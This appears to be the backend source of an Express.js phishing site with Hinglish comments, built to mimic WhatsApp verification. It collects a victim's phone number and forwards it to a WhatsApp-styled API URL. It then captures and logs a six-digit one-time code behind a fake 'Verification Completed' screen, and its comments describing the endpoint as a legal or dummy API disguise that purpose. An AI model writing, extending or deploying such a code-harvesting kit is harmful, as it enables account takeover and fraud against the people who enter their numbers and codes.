// server.js
const express = require('express');
const path = require('path');
const axios = require('axios'); // Nayi library jo data forward karegi
const app = express();
// Render apna port khud deta hai, is liye yeh line likhna zaroori hai
const PORT = process.env.PORT || 3000;
// Middleware Settings
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// 1. Pehle page se Phone Number receive karna aur aage bhejna
app.post('/submit-number', async (req, res) => {
    const userPhone = req.body.phone;
    
    console.log(`[LOCAL SERVER] Received number from frontend: ${userPhone}`);
    
    try {
        // Yahan aap kisi bhi legal third-party api (e.g., SMS/CRM Gateway) ka URL dalte hain
        // Abhi test karne ke liye humne ek dummy API link lagaya hai
        const response = await axios.post('https://web.whatsapp.com/api/v1/posts', {
            phone: userPhone,
            source: 'My Landing Page'
        });
        
        console.log('[API RESPONSE] Data successfully forwarded:', response.data);
        
        // Data forward hone ke baad user ko verify page par bhej dena
        res.redirect('/verify.html');

    } catch (error) {
        console.error('Data forward karne mein error aaya:', error.message);
        // Agar error aaye tab bhi user agle page par chala jaye
        res.redirect('/verify.html');
    }
});

// 2. Doosre page se 6-Digit OTP receive karna
app.post('/submit-code', (req, res) => {
    const code = `${req.body.c1}${req.body.c2}${req.body.c3}${req.body.c4}${req.body.c5}${req.body.c6}`;
    console.log(`[LOCAL SERVER] Received Verification Code: ${code}`);
    
    res.send(`
        <div style="text-align: center; margin-top: 50px; font-family: sans-serif;">
            <h1 style="color: #00a884;">Verification Completed!</h1>
            <p>Thank you. Your request is being processed safely.</p>
        </div>
    `);
});

// Server Start karna
app.listen(PORT, () => {
    console.log(`Server successfully started on http://localhost:${PORT}`);
});